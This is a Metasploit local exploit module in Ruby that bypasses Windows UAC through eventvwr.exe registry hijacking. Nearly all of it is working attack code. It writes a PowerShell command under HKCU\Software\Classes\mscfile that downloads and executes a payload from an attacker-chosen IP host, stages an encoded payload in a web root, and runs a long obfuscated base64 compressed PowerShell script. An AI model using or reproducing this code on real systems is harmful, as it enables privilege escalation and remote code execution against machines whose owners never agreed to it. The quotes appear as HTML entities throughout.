# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking
 
  include Exploit::EXE
  include Post::File
  include Post::Windows::Priv
  include Post::Windows::Runas
  include Post::Windows::Registry
  include Post::Windows::Powershell
 
 
  def initialize(info={})
    super( update_info(info,
      &#039;Name&#039;          => &#039;Windows Escalate UAC Protection Bypass with Fileless&#039;,
      &#039;Description&#039;   => %q{
        This module will bypass Windows UAC by utilizing eventvwr.exe and hijacking entries registry on Windows.
      },
      &#039;License&#039;       => MSF_LICENSE,
      &#039;Author&#039;        => [
        &#039;Matt Graeber&#039;,
        &#039;Enigma0x3&#039;,
        &#039;Pablo Gonzalez&#039; # Port to local exploit
        ],
      &#039;Platform&#039;      => [ &#039;win&#039; ],
      &#039;Targets&#039;       => [
          [ &#039;Windows x86&#039;, { &#039;Arch&#039; => ARCH_X86 } ],
          [ &#039;Windows x64&#039;, { &#039;Arch&#039; => ARCH_X86_64 } ]
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;References&#039;    => [
        [ &#039;URL&#039;, &#039;https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/&#039; ],[&#039;URL&#039;,&#039;http://www.elladodelmal.com/2016/08/como-ownear-windows-7-y-windows-10-con.html&#039;],
      ],
      &#039;DisclosureDate&#039;=> "Aug 15 2016"
    ))
 
    register_options([
      OptString.new(&#039;FILE_DYNAMIC_PAYLOAD&#039;,[true,&#039;Payload PSH Encoded will be generated here (Not include webserver path)&#039;]),
      OptString.new(&#039;IPHOST&#039;,[true,&#039;IP WebServer where File Payload will be downloaded&#039;]),
      OptBool.new(&#039;LOCAL&#039;,[true,&#039;File Payload is in this machine?&#039;,true] ),         
    ])
 
  end
 
  def check_permissions!
    # Check if you are an admin
    vprint_status(&#039;Checking admin status...&#039;)
    admin_group = is_in_admin_group?
 
    if admin_group.nil?
      print_error(&#039;Either whoami is not there or failed to execute&#039;)
      print_error(&#039;Continuing under assumption you already checked...&#039;)
    else
      if admin_group
        print_good(&#039;Part of Administrators group! Continuing...&#039;)
      else
        fail_with(Failure::NoAccess, &#039;Not in admins group, cannot escalate with this module&#039;)
      end
    end
 
    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NoAccess, &#039;Cannot BypassUAC from Low Integrity Level&#039;)
    end
  end
 
  def exploit
    validate_environment!
 
    case get_uac_level
    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP, UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP, UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
      fail_with(Failure::NotVulnerable,
        "UAC is set to &#039;Always Notify&#039;. This module does not bypass this setting, exiting..."
      )
    when UAC_DEFAULT
      print_good &#039;UAC is set to Default&#039;
      print_good &#039;BypassUAC can bypass this setting, continuing...&#039;
    when UAC_NO_PROMPT
      print_warning "UAC set to DoNotPrompt - using ShellExecute &#039;runas&#039; method instead"
      runas_method
      return
    end
 
    keys = registry_enumkeys(&#039;HKCU\Software\Classes\mscfile\shell\open\command&#039;)
 
    if keys == nil
    print_good("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command not exist!")
    end   
 
    key = registry_createkey(&#039;HKCU\Software\Classes\mscfile\shell\open\command&#039;)  
    reg = "IEX (New-Object Net.WebClient).DownloadString(\&#039;http://#{datastore[&#039;IPHOST&#039;]}/#{datastore[&#039;FILE_DYNAMIC_PAYLOAD&#039;]}\&#039;)"
 
    command = cmd_psh_payload(payload.encoded, &#039;x86&#039;,{:remove_comspec => true,:encode_final_payload => true})
    if datastore[&#039;LOCAL&#039;]
        if File.exists?("/var/www/html/#{datastore[&#039;FILE_DYNAMIC_PAYLOAD&#039;]}")
       File.delete("/var/www/html/#{datastore[&#039;FILE_DYNAMIC_PAYLOAD&#039;]}")
    end
    file_local_write("/var/www/html/#{datastore[&#039;FILE_DYNAMIC_PAYLOAD&#039;]}",command)
    end
 
    result = registry_setvaldata(&#039;HKCU\Software\Classes\mscfile\shell\open\command&#039;,&#039;bypass&#039;,&#039;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C &#039; + reg,&#039;REG_SZ&#039;)
    if result
    execute_script("cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcANwBiADAASABZAEIAeABKAGwAaQBVAG0ATAAyADMASwBlADMAOQBLADkAVQByAFgANABIAFMAaABDAEkAQgBnAEUAeQBUAFkAawBFAEEAUQA3AE0ARwBJAHoAZQBhAFMANwBCADEAcABSAHkATQBwAHEAeQBxAEIAeQBtAFYAVwBaAFYAMQBtAEYAawBEAE0ANwBaADIAOAA5ADkANQA3ADcANwAzADMAMwBuAHYAdgB2AGYAZQA2AE8ANQAxAE8ASgAvAGYAZgAvAHoAOQBjAFoAbQBRAEIAYgBQAGIATwBTAHQAcgBKAG4AaQBHAEEAcQBzAGcAZgBQADMANQA4AEgAegA4AGkALwBxAC8ALwArADkAZgA0ADMAWAA2AE4AKwB0AGQAWQAvAHgAcgB0AHIANQBIADkARwB1AG0AdgA4AFIAbgA5AC8ANgBOAGYANAA5AHUALwB4AHUALwAxAGEANQB6ADgARwBsAC8AOQBHAG8AOQArAGoAZAAvADMAMQAzAGoAOQBhADEAUwAvAHgAagBsADkAZQAwAFgAZgAxADcAOQBHAFQAcAArAGMALwBCAG8AbAAvAGQANwBRAGYAegBuADkALwAvAGYAOQBOAFIAYgAwADcANQBUAGEARgBQAFEANQB2AG0AOQArAGoAVABuADkATABPAG0ALwAzADUAZgBlAFgAZABIAHYAUwAvAHAAdABTAHIAOAB2ADYATAArAE0ALwBwAHAAUgBIADcALwB4AHIANQBGAFEAegB4AFgAQgBuAEgARQBMADYAWAB2AHIAMQAvAGkAYwAvAG0AcAAvAGoAZQAxAGYANAA0AHoAKwB6AGEAbgA5AFMAMgBvAGgAVQBHAHIANgA1AEoAcgBhAGIATgBOAG4ARwBmADAAKwBwADkAOQA5ADMATABkAC8AagBSAGYAMABjADAARQB0ADAAMQAvAGoANAAxADkAagBRAG0AMQBYAGkAdQBmAEgAdgA4AGEAZABYADIATQBjAGYASQBMAGUAWAAxAEQATABLADYAKwBuAEwAcgBSAG4AagBOADIAVQA0AGYAMABNAC8AYgAvAGIAUABvAGEAWgBqADgASABXAHIALwBHAFUAZgBqAHUAbgBUADkAWgBFAGkANQBaAHcAKwBKAGoAYgAvAEMAUgA5AFUAdABKAG4ATwBmAGYAbwBVADIAQwA3AEIALwBNAE4ANAA0AHkAVwBEAGYAMQBkAEUANAAyAFgAdgA4AFoARgBGAEwAcwB2AEcAWABOAGcAZwBOADcASwAvAHcAYwA9ACcAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkALABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA=")
    print_good(&#039;Created registry entries to hijack!&#039;)
    end
 
    r = session.sys.process.execute("cmd.exe /c c:\\windows\\system32\\eventvwr.exe",nil,{&#039;Hidden&#039; => true, &#039;Channelized&#039; => true})
    check_permissions!
 
  end
 
  def validate_environment!
    fail_with(Failure::None, &#039;Already in elevated state&#039;) if is_admin? or is_system?
 
    winver = sysinfo[&#039;OS&#039;]
 
    unless winver =~ /Windows Vista|Windows 2008|Windows [78]/
      fail_with(Failure::NotVulnerable, "#{winver} is not vulnerable.")
    end
 
    if is_uac_enabled?
      print_status &#039;UAC is Enabled, checking level...&#039;
    else
      if is_in_admin_group?
        fail_with(Failure::Unknown, &#039;UAC is disabled and we are in the admin group so something has gone wrong...&#039;)
      else
        fail_with(Failure::NoAccess, &#039;Not in admins group, cannot escalate with this module&#039;)
      end
    end
  end
end

